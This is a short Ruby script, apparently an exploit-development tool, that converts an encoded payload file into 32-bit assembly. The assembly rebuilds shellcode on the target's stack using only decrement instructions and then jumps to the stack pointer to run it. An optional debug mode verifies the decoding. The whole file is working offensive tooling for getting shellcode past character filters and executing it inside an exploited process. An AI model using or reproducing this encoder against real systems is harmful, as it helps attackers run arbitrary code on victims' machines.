#
# This script generates the final version of the encoded assembly. It
# transforms the provided encoded payload bytes into a sequence of DEC ESP /
# DEC DWORD [ESP-0x1] instructions which will ultimately generate the
# encoded payload on the target stack when executed.
#

if ARGV[0].nil? 
	puts "enc.rb [encoded payload bin]"
	exit
end

fd = File.open(ARGV[0], "rb")

state = "\x00\x00\x00\x00"
buf = fd.read.reverse
ary = []
idx = 0

#
# Enumerate each byte of the encoded payload calculating the number of
# decrements that will be required at each stack location to generate the
# corresponding unencoded value.
#

buf.each_byte { |byte|
	current_int = state[0,4].unpack('V')[0]
	decrement = 256 - byte
	new_int = current_int - decrement

	if new_int & 0xff00 != current_int & 0xff00
		ary[idx-1] -= 1 if ary.length > 0
	end

	if new_int & 0xff0000 != current_int & 0xff0000
		ary[idx-2] -= 1 if ary.length > 1
	end

	if new_int & 0xff000000 != current_int & 0xff000000
		ary[idx-3] -= 1 if ary.length > 2
	end

	ary[idx] = decrement
	new = [new_int].pack('V')

	state = "\x00" + new + state[4..-1]

	idx += 1
}

#
# Generate the final version of the encoded assembly.
#

puts "BITS 32"
puts "main:"
puts "move_stack:"
puts "\t%rep 0x4"
puts "\ttimes 0xfff dec esp"
puts "\tdb 0xff, 0x4c, 0xe4, 0xff"
puts "\tdec esp"
puts "\t%endrep"
puts

puts "alignment:"

pad = (4 - (ary.length & 0x3)) & 0x3

pad.times { 
	puts "\tdec esp"
}

puts
puts "decode:"

ary.each { |dec|
	puts "\ttimes 0x%.2x db 0xff, 0x4c, 0xe4, 0xff\n" % dec
	puts "\tdec esp\n"
}

puts "execute:"
puts "\tjmp esp\n"

#
# Debug checks to verify that the final version of the encoded payload matches
# the original version when decoded.
#

if ARGV[1] == 'debug'

state = "\x00\x00\x00\x00"
state_off = 0

ary.each { |decrement|
	current_int = state[0,4].unpack('V')[0]
	new_int = current_int - decrement
	new = [new_int].pack('V')

	$stderr.puts "DEC: %.8x - %.8x = %.8x" % [current_int,decrement,new_int]

	state = "\x00" + new + state[4..-1]

	$stderr.puts "DEC: dec %.8x -- #{state.unpack("H*")[0]}" % decrement
}

end
